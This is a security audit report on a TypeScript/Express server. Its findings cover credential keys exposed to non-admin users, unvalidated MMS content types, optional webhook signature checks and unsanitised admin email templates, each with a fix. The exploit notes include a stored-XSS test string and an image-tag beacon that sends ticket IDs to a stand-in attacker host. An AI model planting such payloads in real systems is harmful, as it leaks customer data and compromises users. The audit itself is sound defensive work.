# S18 — Prototype Pollution · Mass Assignment · Body-Parser Quirks

**Audit scope:** `packages/server/src/routes/settings.routes.ts`, `services/automations.ts`, `utils/validate.ts`, `middleware/*`, all PATCH/PUT route handlers, body-parser configuration in `index.ts`.

---

### [MEDIUM] Vonage API key exposed to all authenticated users via GET /config and GET /store

**Where:** `packages/server/src/routes/settings.routes.ts:316` (SENSITIVE_CONFIG_KEYS definition) and `:197` (ALLOWED_CONFIG_KEYS includes `sms_vonage_api_key`)

**What:**
`SENSITIVE_CONFIG_KEYS` (lines 316–324) is the blocklist that hides credentials from non-admin callers of `GET /config` and `GET /store`. Both endpoints are mounted behind only `authMiddleware` (any authenticated user), not `adminOnly`. `sms_vonage_api_key` is stored in `store_config` (in ALLOWED_CONFIG_KEYS line 197) but is absent from SENSITIVE_CONFIG_KEYS. The Vonage API key is a live credential that authorises SMS send and account operations — it is not a mere identifier.

**Code:**
```typescript
// packages/server/src/routes/settings.routes.ts:316
const SENSITIVE_CONFIG_KEYS = new Set([
  'tcx_password',
  'smtp_pass',
  'blockchyp_api_key', 'blockchyp_bearer_token', 'blockchyp_signing_key',
  'sms_twilio_auth_token', 'sms_telnyx_api_key', 'sms_bandwidth_password',
  'sms_plivo_auth_token', 'sms_vonage_api_secret',
  'backup_s3_access_key', 'backup_s3_secret_key',
  // MISSING: 'sms_vonage_api_key'   ← exposed to technicians/cashiers
]);
// GET /config (line 391): no adminOnly middleware; filters only SENSITIVE_CONFIG_KEYS
router.get('/config', async (req, res) => { ... });
```

**Exploit:**
A technician-role user calls `GET /api/v1/settings/config`. The response includes `sms_vonage_api_key` in plaintext alongside all other non-sensitive config. The attacker uses this key to send SMS messages billed to the victim tenant or to enumerate account details via the Vonage API.

**Fix:**
Add `'sms_vonage_api_key'` to `SENSITIVE_CONFIG_KEYS`. Also audit the following for the same omission: `sms_bandwidth_username`, `sms_bandwidth_account_id`, `sms_plivo_auth_id`, `smtp_user`, `tcx_username` — these are partial credentials or usernames that, combined with leaked context, reduce the difficulty of brute-forcing or account enumeration.

---

### [LOW] Additional partial credentials exposed to non-admin authenticated users

**Where:** `packages/server/src/routes/settings.routes.ts:316–324`

**What:**
Beyond the Vonage API key, several additional keys stored in `store_config` and readable by any authenticated user are missing from `SENSITIVE_CONFIG_KEYS`: `sms_bandwidth_username` (credentials factor alongside `account_id`), `sms_plivo_auth_id` (Plivo account SID, required for forging API requests), `smtp_user` (email username, combined with timing on brute force), `tcx_host`, `tcx_username`, `tcx_extension` (VoIP account identifiers). Any authenticated user — including a recently-hired technician — can enumerate these via `GET /config` or `GET /store`.

**Code:**
```typescript
// keys in ALLOWED_CONFIG_KEYS but absent from SENSITIVE_CONFIG_KEYS:
'sms_twilio_account_sid',    // Twilio Account SID (partial credential)
'sms_bandwidth_account_id',  // Bandwidth account identifier
'sms_bandwidth_username',    // Bandwidth username (auth factor)
'sms_plivo_auth_id',         // Plivo auth ID (partial credential)
'smtp_user',                 // SMTP username
'tcx_host', 'tcx_username',  // 3CX VoIP host + user
```

**Exploit:**
Authenticated technician calls `GET /api/v1/settings/config`. Response returns Twilio Account SID, Bandwidth username, Plivo Auth ID, SMTP username, and 3CX host in plaintext. These partial credentials reduce the effort to conduct phishing, API abuse, or lateral account compromise if auth tokens are discovered via other means.

**Fix:**
Add all account identifiers and usernames that form part of provider credentials to `SENSITIVE_CONFIG_KEYS`. Alternatively, refactor to separate public-facing config (timezone, currency, receipt settings) from credential-bearing config and never return the latter to non-admin roles, even with values omitted.

---

### [LOW] Twilio MMS provider-reported content-type stored pre-validation in sms_messages.media_types

**Where:** `packages/server/src/routes/sms.routes.ts:948,1035` and `packages/server/src/providers/sms/twilio.ts:74`

**What:**
Twilio's `parseInboundWebhook` reads `req.body[MediaContentType${i}]` (URL-encoded, provider-supplied) and returns it in the `MmsMedia.contentType` field. The inbound webhook handler at `sms.routes.ts:948` pushes this value into `mediaTypes[]` which is then JSON-serialised and written to `sms_messages.media_types` (line 1035) regardless of what the actual fetched response's `Content-Type` header says. The signature check at line 917 mitigates forged webhooks, but if signature verification is ever bypassed or misconfigured, an attacker can persist arbitrary strings (including HTML/script) into the `media_types` column.

**Code:**
```typescript
// sms/twilio.ts:73-75
const url = req.body[`MediaUrl${i}`];
const type = req.body[`MediaContentType${i}`];
if (url) media.push({ url, contentType: type || 'application/octet-stream' });

// sms.routes.ts:948,1035
mediaTypes.push(m.contentType);               // attacker-controlled string
...
JSON.stringify(mediaTypes),                    // stored to DB without sanitisation
```

**Exploit:**
If Twilio signature verification is bypassed (e.g., by disabling HTTPS, shared authToken leakage, or a future provider without `verifyWebhookSignature`), a forged webhook with `MediaContentType0=<script>alert(1)</script>` injects into `sms_messages.media_types`. If the UI renders this column without escaping, it becomes stored XSS.

**Fix:**
Validate `m.contentType` against the same `ALLOWED_MMS_CONTENT_TYPES` allowlist before pushing to `mediaTypes[]`. Reject or normalise values not in the set. This is a belt-and-suspenders fix on top of signature verification.

---

### [INFO] SMS webhook signature verification is optional per-provider — missing implementation silently skips auth

**Where:** `packages/server/src/routes/sms.routes.ts:917` and `packages/server/src/providers/sms/types.ts:85`

**What:**
The inbound webhook handler uses `if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req))`. Because `verifyWebhookSignature` is typed as optional (`?` in `types.ts:85`), a provider that omits the method entirely passes the check without authentication. All current production providers (Twilio, Telnyx, Bandwidth, Plivo, Vonage) implement it, but the console/dev provider does not, and future providers that omit it would silently skip all webhook auth.

**Code:**
```typescript
// types.ts:85
verifyWebhookSignature?(req: any): boolean;  // optional — can be absent

// sms.routes.ts:917
if (provider.verifyWebhookSignature && !provider.verifyWebhookSignature(req)) {
  res.status(403).json({ success: false, message: 'Invalid signature' });
  return;
}
// If verifyWebhookSignature is undefined, this block is skipped entirely
```

**Exploit:**
A newly-integrated SMS provider that omits `verifyWebhookSignature` would accept all inbound webhook requests from the public internet without authentication. An attacker could replay webhook payloads to inject arbitrary inbound SMS content, trigger auto-responders, or modify `sms_messages` records.

**Fix:**
Change the interface to make `verifyWebhookSignature` required. Provide a default "deny all" implementation on the base class for providers that have no webhook signing, and explicitly opt in to "allow all" only for the console provider in dev mode. Alternatively, add a guard: `if (!provider.verifyWebhookSignature) { logger.error('provider missing signature verification'); return res.status(500).send(); }`.

---

### [INFO] qs 6.14 extended:true — prototype pollution CLEARED (no actionable issue)

**Where:** `packages/server/src/index.ts:1233`

**What:**
`express.urlencoded({ extended: true, limit: '1mb' })` uses `qs` v6.14.2. Investigation of `qs/lib/parse.js` confirms: `allowPrototypes` defaults to `false`; `__proto__` is explicitly rejected at the root level (line 205 of parse.js); keys that exist on `Object.prototype` (including `constructor`) are blocked by `has.call(Object.prototype, key) && !allowPrototypes` checks (lines 220–253). No API routes consume deeply-nested form-encoded bodies in a way that could be exploited even if parsing were permissive. All JSON endpoints use `express.json()` which calls `JSON.parse()` — a safe parser that creates literal string keys for `__proto__` without mutating prototype chains.

**Code:**
```typescript
// index.ts:1233
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
// qs 6.14.2: allowPrototypes:false is the default; __proto__ blocked at line 205 of parse.js
```

**Exploit:**
No exploitable prototype pollution path exists. The allowlist-driven config write loops (`Object.entries(req.body)` guarded by `ALLOWED_CONFIG_KEYS.has(key)`) and the `isStringMap()` guard provide defence-in-depth even if the parser were vulnerable.

**Fix:**
No action required. Consider adding `allowPrototypes: false` explicitly to the `express.urlencoded()` options as documentation that the security property is intentional.

---

### [INFO] Automation `action_config.body` is admin-supplied raw HTML stored without server-side sanitisation

**Where:** `packages/server/src/services/automations.ts:342` and `packages/server/src/routes/automations.routes.ts:139–140`

**What:**
POST/PUT automation rules store `action_config` as `JSON.stringify(action_config)` with no server-side validation of the `body` field for `send_email` actions. When the automation fires, `executeSendEmail` interpolates template variables (HTML-escaping substituted values), but the surrounding static HTML template is from `action_config.body` verbatim. An admin who controls an automation can therefore set any HTML in outgoing customer emails — including external image beacons, tracking pixels, or phishing content. This is within the intended admin trust boundary for this system, but is worth noting.

**Code:**
```typescript
// automations.routes.ts:139-140
action_config !== undefined ? JSON.stringify(action_config) : existing.action_config,
// No validation of action_config.body content

// automations.ts:342
const html = interpolate(config.body ?? '', vars, 'html');
// Variable *substitutions* are HTML-escaped; template itself is stored raw from admin
```

**Exploit:**
An admin sets `action_config.body = '<img src="https://attacker.com/beacon?t={ticket_id}">…'` in a `ticket_status_changed` automation. Every customer whose ticket changes status receives an email that pings the attacker's server, leaking ticket IDs and confirming customer email addresses. Impact is bounded to admin-initiated actions within a single tenant.

**Fix:**
No immediate action required if admins are trusted within a tenant. For stricter deployments, add a content security review step or restrict email body to plain-text with a curated set of allowed HTML tags (e.g., via DOMPurify server-side). At minimum, document the trust assumption explicitly in the automations API reference.

---

## Scope Coverage Summary

**Checked and cleared:**

1. **Object.assign with req.body** — No instance of `Object.assign(record, req.body)` found anywhere in routes or services. Confirmed via `grep -rn "Object\.assign"` across all 130+ route files.

2. **`...req.body` spread into object literals** — No spread of `req.body` into config/settings objects. All handlers destructure named fields.

3. **lodash.merge / deepmerge** — No lodash or deepmerge imports anywhere in `packages/server/src/`. Confirmed via grep.

4. **Settings PATCH/PUT mass assignment** — `PUT /config` uses `ALLOWED_CONFIG_KEYS` allowlist (300+ explicit keys); `PUT /store` uses a local `allowed` array; both guard with `isStringMap()`. No arbitrary key injection possible.

5. **User `role`, `is_admin`, `pay_rate`, `pin_hash` mass assignment** — `PUT /settings/users/:id` explicitly extracts only named fields; `CUSTOMER_COLUMNS` allowlist governs customer updates; employee PATCH is `pay_rate`-only; role changes require VALID_ROLES allowlist check and admin_confirm_password re-auth (SEC-P2FA4). No mass assignment vector exists.

6. **`__proto__` / `constructor` / `prototype` filter on urlencoded** — qs 6.14 blocks these by default. No `allowPrototypes: true` override found.

7. **Dynamic SQL UPDATE from req.body keys** — No pattern of `Object.keys(req.body).map(col => ...)` building SQL. All dynamic SET clauses iterate server-controlled allowlists (e.g., `allowedFields` in tickets PATCH, `CUSTOMER_COLUMNS` in customers PUT, `addField()` pattern in locations PATCH).

8. **Automation trigger_config / action_config prototype injection** — `safeParseConfig()` wraps `JSON.parse()` which never mutates prototypes. Parsed objects are accessed by known keys only (status_id, template, subject, body, user_id).

9. **Body size limits** — 1mb global JSON + urlencoded limit; 10mb only on admin-authenticated `POST /api/v1/catalog/bulk-import` (MAX_BULK_ITEMS=5000 array cap also enforced). Rate limiter fires before body parsing.

10. **express.json verify callback** — `req.rawBody = buf` stored only for Stripe webhook signature, does not introduce parsing issues.
